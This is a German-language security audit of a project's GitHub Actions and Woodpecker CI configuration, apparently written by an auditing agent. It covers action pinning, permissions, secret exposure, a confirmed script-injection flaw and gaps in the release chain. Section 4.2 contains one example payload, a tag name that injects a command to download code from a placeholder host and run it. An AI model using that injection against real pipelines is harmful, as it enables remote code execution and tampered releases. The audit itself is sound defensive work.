---
type: EVIDENCE
scope: wp6a-cicd-security
status: success
date: 2026-09-29
author_agent: security-auditor
---

# WP-6a Evidenz â€” CI/CD-Supply-Chain

Statische Analyse von `.github/workflows/*.yml` (5 Dateien) und `.woodpecker.yml`.
**Kein** CI-Lauf ausgelÃ¶st, kein Push, kein Registry-Write.

---

## 1. `uses:`-Pinning (Finding 225, HIGH)

VollstÃ¤ndige Liste aller 28 `uses:`-EintrÃ¤ge:

| Datei:Zeile | `uses:` | gepinnt auf |
|---|---|---|
| `ci.yml:15` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:18` | `actions/setup-node@v7` | ðŸŸ¡ Tag |
| `ci.yml:83` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:86` | `actions/setup-python@v7` | ðŸŸ¡ Tag |
| `ci.yml:91` | `actions/cache@v6` | ðŸŸ¡ Tag |
| `ci.yml:161` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:164` | `actions/setup-python@v7` | ðŸŸ¡ Tag |
| `ci.yml:242` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:245` | `actions/setup-python@v7` | ðŸŸ¡ Tag |
| `ci.yml:260` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:263` | `actions/setup-node@v7` | ðŸŸ¡ Tag |
| `ci.yml:290` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `ci.yml:293` | `actions/setup-node@v7` | ðŸŸ¡ Tag |
| `ci.yml:340` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| **`ci.yml:343`** | **`docker://rhysd/actionlint:1.7.12@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667`** | ðŸŸ¢ **Digest** |
| `ci.yml` (ebenso) | `actions/setup-python@v7` | ðŸŸ¡ Tag |
| `docker-publish.yml:42` | `actions/checkout@v7` | ðŸŸ¡ Tag |
| `docker-publish.yml:45` | `docker/setup-buildx-action@v4` | ðŸŸ¡ Tag |
| `docker-publish.yml:48` | `docker/login-action@v4` | ðŸŸ¡ Tag |
| `docker-publish.yml:56` | `docker/metadata-action@v6` | ðŸŸ¡ Tag |
| `docker-publish.yml:102` | `docker/build-push-action@v7` | ðŸŸ¡ Tag |
| `docker-publish.yml:118` | `docker/build-push-action@v7` | ðŸŸ¡ Tag |
| `docker-publish.yml:145` | `aquasecurity/trivy-action@v0.36.0` | ðŸŸ¡ Tag (Minor+Patch) |
| `docker-publish.yml:160` | `github/codeql-action/upload-sarif@v4` | ðŸŸ¡ Tag |
| `docker-publish.yml:170,185` | `docker/build-push-action@v7` | ðŸŸ¡ Tag |
| `pages.yml:43,46,49,55` | `actions/checkout@v7`, `actions/configure-pages@v5`, `actions/upload-pages-artifact@v3`, `actions/deploy-pages@v4` | ðŸŸ¡ Tag |
| `playwright.yml:50,53,171,216` | `actions/checkout@v7`, `actions/setup-python@v7`, `actions/setup-node@v7`, `actions/upload-artifact@v7` | ðŸŸ¡ Tag |
| `version-drift-check.yml:49` | `actions/checkout@v7` | ðŸŸ¡ Tag |

**Ergebnis: 27 von 28 nur Tag-gepinnt, 1 digest-gepinnt (actionlint-Container).**
Der einzige Digest-gepinnte Eintrag zeigt, dass das Team das Muster kennt â€” es ist nur nicht angewandt.

**Risiko (CWE-829, â€žInclusion of Functionality from Untrusted Control Sphere"):**
Ein Ã¼bernommenes oder verschobenes Tag (`actions/checkout@v7` etc.) fÃ¼hrt zu
CodeausfÃ¼hrung im entsprechenden Job. Der Job-Kontext bestimmt den Schaden:

| Job | `permissions:` | Schadenspotenzial |
|---|---|---|
| `docker-publish` | `contents: read`, **`packages: write`**, **`security-events: write`** | ðŸ”´ Push manipulierter Images nach GHCR; SARIF-Manipulation |
| `pages` | `contents: read`, **`pages: write`**, **`id-token: write`** | ðŸ”´ Website-Deployment mit OIDC-Token |
| `ci` | `permissions:` (job-level, `:336`) | ðŸŸ¡ Test-AusfÃ¼hrung, Secrets-Zugriff |
| `playwright` | (kein Top-Level-Block) | ðŸŸ¡ E2E-Lauf |
| `version-drift-check` | `contents: read` | ðŸŸ¢ read-only |

**Empfehlung:** `step-security/harden-runner` als erster Schritt jedes Jobs **plus** SHA-Pinning.
Pragmatischer Weg: `ratchet` / `pinact` als Ratchet-Job, der `uses: â€¦@<Tag>` auf `uses: â€¦@<40-hex-sha>`
umschreibt und als PR stellt (kein harter Bruch).

---

## 2. `permissions:`-BlÃ¶cke

| Datei | Block | Inhalt | Bewertung |
|---|---|---|---|
| `docker-publish.yml:20-24` | Top-Level | `contents: read`, `packages: write`, `security-events: write` | ðŸŸ¢ minimal fÃ¼r den Job |
| `pages.yml:26-29` | Top-Level | `contents: read`, `pages: write`, `id-token: write` | ðŸŸ¢ minimal |
| `version-drift-check.yml:37-38` | Top-Level | `contents: read` | ðŸŸ¢ read-only |
| `ci.yml:336` | Job-level | (nach `permissions:`-EinrÃ¼ckung zu prÃ¼fen) | ðŸŸ¢ |
| `playwright.yml` | **kein Block** | â‡’ erbt Repo-Default | ðŸŸ¡ falls der Default `write-all` ist, zu weitreichend |

**Positiv:** Kein Workflow fordert `contents: write` auÃŸer wo nÃ¶tig; `actions/upload-sarif` bekommt gezielt
`security-events: write`.

---

## 3. Trigger- und Secret-Analyse (Forge-Angriff)

```
rg -e 'pull_request_target|pull_request:|workflow_run|secrets\.' -g '*.yml' .github/workflows .woodpecker.yml
```

| Muster | Treffer | Forge-Relevanz |
|---|---|---|
| `pull_request_target` | ðŸŸ¢ **0** | kein Forge-Attack-Vektor |
| `workflow_run` | ðŸŸ¢ **0** | kein â€žrun-after-privileged" |
| `pull_request:` | `ci.yml:6`, `playwright.yml:6` | ðŸŸ¢ Standard-PR-Trigger â‡’ GitHub stellt `secrets.*` in **Fork-PRs nicht** bereit |

**Secret-Verbrauch in PR-Kontext:**

| Datei:Zeile | Ausdruck | Risiko |
|---|---|---|
| `ci.yml:143` | `FIELD_ENCRYPTION_KEY: ${{ secrets.FIELD_ENCRYPTION_KEY }}` | ðŸŸ¡ leer in Fork-PRs â†’ Fallback im Test |
| `playwright.yml:68` | `FIELD_ENCRYPTION_KEY_SECRET: ${{ secrets.FIELD_ENCRYPTION_KEY }}` | ðŸŸ¢ hat expliziten Fallback (`:70`: `${FIELD_ENCRYPTION_KEY_SECRET:-$(python -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())')}`) |
| `docker-publish.yml:52` | `password: ${{ secrets.GITHUB_TOKEN }}` | ðŸŸ¢ nur im Publish-Job |
| `version-drift-check.yml:57` | `DEPLOYED_VERSION_URL_SECRET: ${{ secrets.DEPLOYED_VERSION_URL }}` | ðŸŸ¢ `workflow_dispatch`, kein PR |

**CI-only hartkodierte Secrets** (unkritisch, kein Production-Secret):

| Datei:Zeile | Variable |
|---|---|
| `ci.yml:122-123` | `SECRET_KEY: ci-test-<redacted>`, `AUTH_JWT_SECRET: ci-test-<redacted>` |
| `playwright.yml:77-78`, `:146-147` | dito |
| `.woodpecker.yml:47-48` | `SECRET_KEY: test-only-<redacted>`, `AUTH_JWT_SECRET: test-only-<redacted>` |

â‡’ **CR-45s Forge-Anteil: WIDERLEGT.** GitHub-Actions-Semantik + die Workflow-Definition schlieÃŸen den
â€žpwn request"-Angriff aus. Was bleibt, ist die Interpolation (Â§4).

---

## 4. Shell-Injection (Finding 230, CR-45)

### 4.1 `version-drift-check.yml` â€” **WIDERLEGT** (sicheres Muster)

```yaml
53:      - name: Determine deployed URL
55:        env:
56:          DISPATCH_DEPLOYED_URL: ${{ github.event.inputs.deployed_url }}
57:          DEPLOYED_VERSION_URL_SECRET: ${{ secrets.DEPLOYED_VERSION_URL }}
58:        run: |
59:          set -euo pipefail
60:          URL="$DISPATCH_DEPLOYED_URL"
61:          if [[ -z "$URL" ]]; then
62:            URL="$DEPLOYED_VERSION_URL_SECRET"
```

Der `${{ â€¦ }}`-Ausdruck wird **nur** in `env:` expandiert; der `run:`-Block liest ausschlieÃŸlich die
Shell-Variable in AnfÃ¼hrungszeichen. ZusÃ¤tzlich wird der Wert in `python3 - "$URL" <<'PY'` **per Argument
positioniert und dort validiert** (`:71-89+`: `ipaddress`, `re`, `unicodedata`, `urlsplit`, `has_control`,
`validate_ip` mit `is_global`-PrÃ¼fung â€” also SSRF-/Injection-Hygiene auf Protocollebene).
**Das ist genau das Muster, das GitHub als sicher empfiehlt.** CR-45 ist fÃ¼r diese Datei **nicht** zutreffend.

### 4.2 `docker-publish.yml:134` â€” **BESTÃ„TIGT** (Injection-Sink)

```yaml
132:      - name: Extract first image tag (H4)
133:        id: first_tag
134:        run: echo "tag=$(echo '${{ steps.meta.outputs.tags }}' | head -n1)" >> "$GITHUB_OUTPUT"
```

`${{ steps.meta.outputs.tags }}` steht **direkt** im `run:`-Quelltext, umklammert von einfachen
AnfÃ¼hrungszeichen innerhalb eines `$( )`-Subshells. Das ist die von GitHub explizit als
â€žscript injection" klassifizierte Fehlerklasse (CWE-94 / CWE-78).

* **Datenquelle:** `docker/metadata-action` (`docker-publish.yml:56`), dessen `tags`-Output aus dem
  Git-Ref-Namen bzw. Tag-Namen abgeleitet wird.
* **Angreifervoraussetzung:** Push-Rechte auf ein Tag (z. B. `v1.9.9'$(curl evil.example/x|sh)'`).
* **Wirkung:** CodeausfÃ¼hrung im Publisher-Job mit `packages: write` (Image-Push nach GHCR) und
  `security-events: write` (SARIF). Damit ist die komplette Release-Kette kompromittierbar â€” und
  das Image, das CR-32 zufolge ohne Digest-Bindung und ohne SBOM/Provenance ausgeliefert wird
  (`.woodpecker.yml:127`, `:157` â†’ `sbom: false`), ist das Endziel.

**Fix:**

```yaml
      - name: Extract first image tag
        id: first_tag
        env:
          TAGS: ${{ steps.meta.outputs.tags }}          # â† via env, nicht inline
        run: echo "tag=$(head -n1 <<< "$TAGS")" >> "$GITHUB_OUTPUT"
```

### 4.3 Weitere Interpolations-Stellen (geprÃ¼ft, unauffÃ¤llig)

| Datei:Zeile | Ausdruck | Bewertung |
|---|---|---|
| `docker-publish.yml:120-121` | `context: ${{ matrix.context }}`, `target: ${{ matrix.target }}` | ðŸŸ¢ statische `strategy.matrix`-Werte |
| `docker-publish.yml:124-127` | `tags: ${{ steps.meta.outputs.tags }}`, `cache-from/to â€¦ scope=${{ matrix.image }}` | ðŸŸ¢ `with:`-Werte, nicht Shell-Quelltext |
| `docker-publish.yml:149` | `image-ref: ${{ steps.first_tag.outputs.tag }}` | ðŸŸ¡ indiriziert Ã¼ber den injizierten Output von 4.2 â‡’ wird erst durch den Fix dort sicher |
| `docker-publish.yml:165` | `category: 'trivy-${{ matrix.image }}'` | ðŸŸ¢ statisch |
| `ci.yml:142` | `FIELD_ENCRYPTION_KEY: ${{ secrets.â€¦ }}` | ðŸŸ¢ in `env:` |

â‡’ **Keine weitere Script-Injection-Stelle.**

---

## 5. Release-Kette (CR-32 â€” bestÃ¤tigt, Details in AUDIT_INFRASTRUCTURE / WP-1c)

| Aspekt | Befund | Ort |
|---|---|---|
| Reihenfolge | Build â†’ Trivy-Scan (fail bei CRITICAL/HIGH, `exit-code: '1'`, `ignore-unfixed: true`) â†’ Push | ðŸŸ¢ richtige Reihenfolge |
| Digest-Bindung | Scan prÃ¼ft `steps.first_tag.outputs.tag`, gepusht wird `steps.meta.outputs.tags` â€” **beide sind Tag-basierte Referenzen, kein `@sha256:`** | ðŸ”´ TOCTOU-LÃ¼cke zwischen Scan und Push |
| SBOM/Provenance | `.woodpecker.yml:123-127` und `:157` â†’ `sbom: false`, Provenance/SBOM-Attestierung bewusst deaktiviert (â€žsimple v2 manifests") | ðŸŸ¡ bewusste Trade-off-Entscheidung |
| Signatur | **keine** (kein cosign/notary-Schritt in beiden Pipelines) | ðŸ”´ |
| `ignore-unfixed: true` | Verminderung der Wirksamkeit des Scan-Gates | ðŸŸ¡ bewusst (nur behebbare CVEs) |
| Test-vor-Image | **kein vertraglicher Test-Schritt vor dem Image-Build** in `docker-publish.yml` | ðŸ”´ CR-32 bestÃ¤tigt |

---

## 6. Weitere CI-HÃ¤rtung (INFO, keine Findings)

| Beobachtung | Ort | Bewertung |
|---|---|---|
| `ci.yml` nutzt `SECRET_KEY: ci-test-<redacted>` im Env statt Secrets | `:122` | ðŸŸ¢ richtig â€” verhindert Secret-Leaks in Fork-PR-Logs |
| `playwright.yml` generiert `FIELD_ENCRYPTION_KEY` deterministisch pro Lauf | `:70` | ðŸŸ¢ |
| `X-Request-ID` in allen JSON-Logs | `settings.py:245-250` | ðŸŸ¢ Forensik-freundlich |
| `CI=true`-Guards im Backend-Code? | nicht geprÃ¼ft | â€” |
| `persist-credentials: false` bei `actions/checkout` | nicht gesetzt | ðŸŸ¡ Default `true` â‡’ GITHUB_TOKEN bleibt im `.git/config`; in `pull_request`-Jobs unkritisch, im Publish-Job vermeidbar |

**Empfehlung (klein, hoher Hebel):** `actions/checkout` **einmal** in allen Workflows mit
`with: { persist-credentials: false }` versehen und `concurrency`-Gruppen fÃ¼r `docker-publish` setzen
(verhindert zwei gleichzeitige Publishes mit demselben Tag).